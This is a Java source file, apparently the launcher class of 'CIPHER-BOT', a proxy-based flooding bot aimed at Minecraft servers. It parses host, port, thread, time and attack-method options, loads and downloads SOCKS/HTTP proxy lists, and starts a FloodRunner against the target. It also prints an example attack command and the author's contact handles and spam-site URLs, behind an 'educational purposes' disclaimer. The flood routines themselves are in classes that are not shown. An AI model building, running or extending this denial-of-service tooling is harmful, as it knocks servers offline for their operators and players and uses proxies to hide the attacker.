///Created by Daniel.Arvizu.Rosselli ///
// Free Use | No Licence //
// Made For Educational Purposes | Enjoy :D //
package me.arvizu.rompeculos;

import java.net.Proxy;
import java.nio.ByteBuffer;
import java.util.Objects;
import me.arvizu.rompeculos.flood.FloodRunner;
import me.arvizu.rompeculos.helper.httpproxieslokas;
import me.arvizu.rompeculos.helper.proxieslokas;
import me.arvizu.rompeculos.option.Options;
import me.arvizu.rompeculos.proxy.Proxies;

public class RompeCulos {
  private final String version = "3.7 (Public)";
  
  private final Options options;
  
  public static int protocol;
  
  public static int nickSizes;
  
  public static byte[] protocol_bytes;
  
  public RompeCulos(Options options) {
    this.options = options;
  }
  
  public void launch() {
if (!this.options.isOption("host")) {
      System.out.println("\033[31m    / ======= \\\n" +
"\033[31m   / __________\\\n" +
"\033[31m  | ___________ | ________________________________________________________\n" +
"\033[31m  | | -       | |\033[33m  CIPHER-BOT Release by Arvizu | CIPHER-BOT Owner\n" +
"\033[31m  | |         | |         \033[32m#########Contact#########\n" +
"\033[31m  | |_________| | ________________________________________________________\n" +
"\033[31m  \\=____________/ \033[36m  Telegram : \033[1;35m@Theresa_me \033[36mDiscord: \033[1;35mDaniel.Arvizu.Rosselli#8686       \n" +
"\033[31m  / \"\"\"\"\"\"\"\"\"\"\" \\    discord.bio/p/arvizu   www.cipher-bot.me  www.mcspam.pw        \n" +
"\033[31m / ::::::::::::: \\                  \n" +
"\033[31m(_________________)");
            System.out.println("\033[32m __ __    ___  _      ____  \n" +
"\033[32m|  |  |  /  _]| |    |    \\ \n" +
"\033[32m|  |  | /  [_ | |    |  o  )\n" +
"\033[32m|  _  ||    _]| |___ |   _/ \n" +
"\033[32m|  |  ||   [_ |     ||  |   \n" +
"\033[32m|  |  ||     ||     ||  |   \n" +
"\033[32m|__|__||_____||_____||__|   \n" +
"\033[32m                            ");
            System.out.println("");
            System.out.println("");
      System.out.println("##############################################################################################################");
      System.out.println("\033[31mExample:");
      System.out.println("\033[32mjava -jar\033[35m CIPHER-BOT.jar\033[32m host=? port=? proxies=? threads=? time=? method=?");
      System.out.println("##############################################################################################################");
            return;
        }
    String proxiesType = (String)this.options.getOption("proxiesType", "socks");
    String proxiesFile = (String)this.options.getOption("proxies", "cipher-bot.txt");
    protocol = ((Integer)this.options.getOption("protocol", Integer.valueOf(47))).intValue();
    protocol_bytes = ByteBuffer.allocate(4).putInt(protocol).array();
    nickSizes = ((Integer)this.options.getOption("nickSizes", Integer.valueOf(16))).intValue();
    Proxies proxies = new Proxies();
    try {
      if (proxiesType.equals("socks")) {
        proxies.init(proxiesFile, Proxy.Type.SOCKS);
      } else if (proxiesType.equals("http")) {
        proxies.init(proxiesFile, Proxy.Type.HTTP);
      } 
    } catch (Exception ex) {
      System.out.println("Error Finding the proxies : cipher-bot.txt");
      return;
    } 
    proxieslokas.downloadFile(proxies);
    httpproxieslokas.downloadFile(proxies);
    Objects.requireNonNull(this);
    System.out.println("\033[31m                                                 \n @@@@@@@ @@@ @@@@@@@  @@@  @@@ @@@@@@@@ @@@@@@@  \n!@@      @@! @@!  @@@ @@!  @@@ @@!      @@!  @@@ \n!@!      !!@ @!@@!@!  @!@!@!@! @!!!:!   @!@!!@!  \n:!!      !!: !!:      !!:  !!! !!:      !!: :!!  \n :: :: : :    :        :   : : : :: ::   :   : : \n                                                 \n                                                 \n            @@@@@@@   @@@@@@  @@@@@@@            \n            @@!  @@@ @@!  @@@   @!!              \n            @!@!@!@  @!@  !@!   @!!              \n            !!:  !!! !!:  !!!   !!:              \n            :: : ::   : :. :     :               \n                                                  ");
        System.out.println("\033[33m Starting CIPHER-BOT by \033[1;36mDaniel.Arvizu.Rosselli#8686 " + "\033[33m 3.7 (Public Version)" + "\n\033[35m Proxies amount: " + proxies
        .size());
        System.out.println("\033[36m Released by Arvizu \033[32m###Contact### \033[36m  Telegram : \033[1;35m@Theresa_me \033[36mDiscord: \033[1;35mDaniel.Arvizu.Rosselli#8686");
        System.out.println("\033[31m discord.bio/p/arvizu   www.cipher-bot.me  www.mcspam.pw");
         System.out.println("\033[35m");
    (new FloodRunner(this.options, proxies)).run();
  }
}
